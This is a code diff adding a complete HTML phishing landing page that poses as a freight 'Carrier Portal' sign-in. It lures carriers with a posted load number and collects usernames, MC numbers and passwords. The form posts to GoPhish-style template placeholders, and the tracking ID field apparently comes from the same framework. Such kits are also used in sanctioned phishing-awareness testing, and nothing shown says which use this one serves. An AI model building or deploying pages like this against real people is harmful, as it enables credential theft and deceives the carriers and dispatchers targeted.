@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Carrier Portal — Sign in</title>
+    <style>
+      body { font-family: Arial, sans-serif; background: #f3f5f8; margin: 0; padding: 0; }
+      .wrap { max-width: 380px; margin: 80px auto; background: #fff; padding: 32px;
+              border: 1px solid #d8dde3; border-radius: 4px; }
+      .logo { font-size: 22px; font-weight: 700; color: #c23434; margin-bottom: 24px; }
+      label { display: block; font-size: 13px; color: #555; margin: 12px 0 4px; }
+      input[type=text], input[type=password] {
+        width: 100%; padding: 9px; box-sizing: border-box;
+        border: 1px solid #c2c8d0; border-radius: 3px; font-size: 14px;
+      }
+      .btn { width: 100%; margin-top: 18px; padding: 10px; background: #c23434;
+             color: #fff; border: 0; border-radius: 3px; font-size: 14px; cursor: pointer; }
+      .small { font-size: 11px; color: #888; margin-top: 16px; }
+      a { color: #1455a6; text-decoration: none; }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <div class="logo">Carrier Portal</div>
+      <p style="font-size:13px; color:#444; margin:0 0 16px;">
+        Sign in to claim posted load <b>#LB-87421-LRD</b>.
+      </p>
+      <form action="{{.URL}}" method="post" autocomplete="off">
+        <input type="hidden" name="rid" value="{{.RId}}">
+        <label for="username">Username or MC #</label>
+        <input id="username" name="username" type="text">
+        <label for="userpass">Password</label>
+        <input id="userpass" name="userpass" type="password">
+        <button class="btn" type="submit">Sign in</button>
+      </form>
+      <p class="small">
+        <a href="{{.URL}}">Forgot password?</a> &nbsp;|&nbsp;
+        <a href="{{.URL}}">New carrier? Register</a>
+      </p>
+      <p class="small">
+        Having trouble? Contact your dispatch supervisor.
+      </p>
+    </div>
+  </body>
+</html>
